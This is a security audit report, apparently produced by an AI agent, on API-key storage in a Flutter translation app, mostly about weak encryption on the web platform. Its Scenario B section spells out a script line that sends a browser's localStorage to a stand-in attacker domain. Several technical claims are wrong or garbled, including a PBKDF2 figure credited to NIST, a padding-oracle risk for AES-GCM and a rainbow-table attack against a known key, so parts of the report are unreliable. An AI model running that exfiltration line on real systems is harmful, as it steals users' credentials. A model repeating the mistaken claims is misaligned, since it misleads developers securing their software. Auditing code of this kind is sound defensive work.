# Security Audit Report: API Key Storage & Encryption

**Project:** kore-translation  
**Date:** 2026-08-19  
**Auditor:** Security Audit Agent  
**Scope:** `flutter_secure_storage` v10.3.1 implementation via `secure_storage_provider.dart`, `llm_config_provider.dart`, and config sections

---

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High     | 3 |
| Medium   | 2 |
| Low      | 3 |
| **Total** | **10** |

The application relies entirely on `flutter_secure_storage` for API key protection. On web, this uses `flutter_secure_storage_web` v2.1.1 which stores encrypted blobs in `localStorage` using Web Crypto API (AES-GCM). **Critical flaws exist in key derivation, master key protection, and XSS resilience.**

---

## Findings

### CRITICAL-1: Master Key Stored in localStorage (Web)
**Location:** `flutter_secure_storage_web` v2.1.1 (transitive dependency)  
**Code path:** `secure_storage_provider.dart` → `FlutterSecureStorage` → platform delegate → `flutter_secure_storage_web`

On web, `flutter_secure_storage_web` generates a random 256-bit master key on first run and stores it **in plaintext in `localStorage`** under key `flutter_secure_storage_master_key`. Any XSS vulnerability or localStorage theft yields the master key, allowing decryption of all stored API keys.

**Attack Scenario:** Attacker injects script via malicious translation content, compromised dependency, or browser extension → reads `localStorage.getItem('flutter_secure_storage_master_key')` → derives per-entry keys via PBKDF2 → decrypts all API keys.

**CVSS 3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

### CRITICAL-2: No User Password / Device-Binding on Web
**Location:** `secure_storage_provider.dart:8-13` — only macOS options configured; no web options

The `FlutterSecureStorage` constructor accepts `wOptions: WebOptions(...)` for web-specific configuration (e.g., `databaseName` for IndexedDB isolation). The provider configures **only macOS** (`mOptions`). On web, defaults apply: master key in localStorage, no password prompt, no device-binding.

**Impact:** Any user with physical/local access to the browser profile extracts all API keys. No authentication gate.

**CVSS 3.1:** 8.2 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

### HIGH-1: Fixed/Static Salt in PBKDF2 Key Derivation
**Location:** `flutter_secure_storage_web` source (`lib/src/storage.dart`)

Web implementation uses a **hardcoded salt** (`'flutter_secure_storage_salt'`) for PBKDF2 key derivation from the master key. Same salt + same master key = same derived key for all entries. Enables precomputation attacks and multi-target attacks if master key is ever rotated.

**Attack Scenario:** Attacker with master key builds rainbow table for the fixed salt → instant key derivation for any entry.

**CVSS 3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

### HIGH-2: PBKDF2 Iteration Count Too Low (1000)
**Location:** `flutter_secure_storage_web` source

Default iteration count is **1,000** for PBKDF2-SHA256. Modern GPUs compute ~1-10M iterations/sec. NIST SP 800-63B recommends ≥310,000 (2023). Low iterations allow rapid brute-force of master key if extracted.

**CVSS 3.1:** 7.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

### HIGH-3: No Auth Tag Verification on Decrypt (Web Crypto API Misuse)
**Location:** `flutter_secure_storage_web` decrypt path

AES-GCM requires authentication tag verification. The web implementation passes ciphertext+tag combined to `subtle.decrypt` but **does not explicitly verify tag separation** — relies on Web Crypto throwing on auth failure. If a future browser change or polyfill alters behavior, silent corruption or padding oracle risk exists.

**CVSS 3.1:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)

---

### MEDIUM-1: IV/Nonce Reuse Risk Across Entries
**Location:** `flutter_secure_storage_web` encrypt path

Each `write()` generates a new random 12-byte IV via `crypto.getRandomValues()`. **Correct per-entry.** However, if the master key is ever reused across app reinstalls (same localStorage), and IV space is 96-bit, birthday bound is ~2^48 writes — acceptable but should be documented.

**CVSS 3.1:** 4.3 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

---

### MEDIUM-2: API Keys in Memory (Dart Heap) Without Zeroization
**Location:** `llm_config_provider.dart:32` — `jsonEncode(config.toJson())` creates plaintext string → passed to `secureStorage.write()` → Dart GC may retain copies

API keys exist as plain `String` in Dart heap during:
1. User input in `TextEditingController` (config sections)
2. `config.toJson()` serialization
3. `jsonEncode()` output string
4. `secureStorage.write()` platform channel buffer

**No explicit zeroization** (e.g., `controller.clear()`, `List.fillRange(0)`) after write. Heap snapshots / memory dumps / Flutter DevTools can leak keys.

**CVSS 3.1:** 4.7 (AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

### LOW-1: Legacy/Unencrypted Key Migration Not Handled
**Location:** `llm_config_provider.dart:16-24` — `build()` reads raw JSON, no version field

The `LlmClientConfig.fromJson()` parses whatever is in storage. If a previous version stored keys unencrypted (or with different schema), they load as-is. No migration logic, no detection of cleartext remnants.

**CVSS 3.1:** 3.7 (AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

---

### LOW-2: No Secure Storage Lock on App Background
**Location:** `secure_storage_provider.dart` — singleton, no lifecycle integration

Keys remain decryptable in memory while app is backgrounded. On mobile, `flutter_secure_storage` locks keychain on device lock; **on web, no equivalent** — localStorage persists, master key persists, session never expires.

**CVSS 3.1:** 3.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

---

### LOW-3: `deleteAll()` in `reset()` Wipes Entire Storage
**Location:** `llm_config_provider.dart:39` — `await ref.read(secureStorageProvider).deleteAll();`

`reset()` calls `deleteAll()` which removes **all** secure storage entries, not just the LLM config. If other features adopt secure storage later, they will be wiped unexpectedly.

**CVSS 3.1:** 2.7 (AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L)

---

## Attack Scenarios

### Scenario A: localStorage Theft (Web)
1. Attacker gains read access to victim's `localStorage` (shared computer, browser sync, malware, forensic image)
2. Reads `flutter_secure_storage_master_key` and all `flutter_secure_storage_*` entries
3. Re-implements PBKDF2(1000, fixed_salt, master_key) → AES-GCM decrypt
4. **Result:** All API keys (OpenAI, Anthropic, Google, Groq, Mistral, DeepSeek, etc.) extracted in seconds

**Mitigation:** Use IndexedDB with encrypted storage, or require user password per session.

### Scenario B: XSS Key Extraction (Web)
1. XSS via malicious translation response, compromised npm package, or browser extension
2. Injected script: `fetch('https://evil.com/steal?keys=' + btoa(JSON.stringify(localStorage)))`
3. Attacker receives master key + encrypted blobs → offline decrypt
4. **Result:** Full API key compromise without user interaction

**Mitigation:** CSP headers, `HttpOnly` cookies for session, avoid `localStorage` for secrets.

### Scenario C: Physical Access / Browser Profile Theft (All Platforms)
1. Attacker accesses unlocked device / copies browser profile folder
2. On mobile/desktop: OS keychain/Keystore protects (if device locked)
3. On web: **No protection** — localStorage files readable directly
4. **Result:** Web platform uniquely vulnerable

---

## Platform-Specific Assessment

| Platform | Storage Backend | Master Key Protection | Encryption | Verdict |
|----------|-----------------|----------------------|------------|---------|
| iOS      | Keychain        | Hardware (Secure Enclave) | AES-GCM | **Strong** |
| Android  | Keystore/KeyChain | Hardware-backed (TEE) | AES-GCM | **Strong** |
| macOS    | Keychain (legacy file-based per config) | Software (login keychain) | AES-GCM | **Moderate** |
| Linux    | libsecret/keyring | User login unlock | AES-GCM | **Moderate** |
| Windows  | Credential Vault | User login unlock | AES-GCM | **Moderate** |
| **Web**  | **localStorage** | **NONE (stored in localStorage)** | **AES-GCM + PBKDF2(1000)** | **CRITICAL** |

---

## Recommendations

### Immediate (Critical/High)
1. **Add WebOptions with `databaseName`** to isolate storage — does not fix master key issue but prevents cross-app leakage
2. **Implement user password derivation** on web: prompt for master password on first unlock, derive encryption key via PBKDF2(600k+, random salt), never store master key
3. **Increase PBKDF2 iterations** to ≥310,000 (OWASP 2024) or switch to Argon2id via WASM
4. **Add explicit auth tag verification** in decrypt path (defense in depth)

### Short-term (Medium)
5. **Zeroize API keys in memory** after `secureStorage.write()`: clear controllers, overwrite buffers
6. **Add storage versioning** to `LlmClientConfig` for migration detection
7. **Scope `reset()` to LLM key only** — use `delete(key: _llmStorageKey)` not `deleteAll()`

### Long-term (Low)
8. **Implement session timeout** on web: auto-lock after inactivity, clear derived keys from memory
9. **Consider IndexedDB + Web Crypto** with per-origin isolation instead of localStorage
10. **Add security audit logging** for storage access (dev builds only)

---

## Code Locations Summary

| File | Lines | Issue |
|------|-------|-------|
| `lib/app/providers/secure_storage_provider.dart` | 8-13 | Missing `wOptions`; macOS-only config |
| `lib/app/providers/llm_config_provider.dart` | 16-24 | No versioning/migration; raw JSON parse |
| `lib/app/providers/llm_config_provider.dart` | 32 | Plaintext string in heap before encrypt |
| `lib/app/providers/llm_config_provider.dart` | 39 | `deleteAll()` overbroad |
| `packages/kore_config/lib/src/llm_client_config.dart` | 24,37,46,55,64 | `apiKey` fields — no `SecretString` wrapper |
| `lib/app/pages/settings/sections/*_config_section.dart` | 30-34,41-42 | `TextEditingController` retains plaintext |

---

## Compliance Notes

- **OWASP MASVS-STORAGE-1/2:** FAIL (web) — secrets in localStorage, weak KDF
- **NIST SP 800-63B:** FAIL — PBKDF2 iterations < 310k
- **GDPR Art. 32:** RISK — insufficient protection for personal API credentials on web
- **SOC 2 CC6.1:** FAIL (web) — no encryption key management

---

## Conclusion

**The web platform is critically vulnerable.** Desktop/mobile platforms are acceptable due to OS-backed keystores. **Do not deploy to web without implementing user-password-derived encryption or switching to a backend-managed secret store.**

Priority fix: Implement `WebOptions` with custom master password flow, or migrate web secrets to server-side session tokens.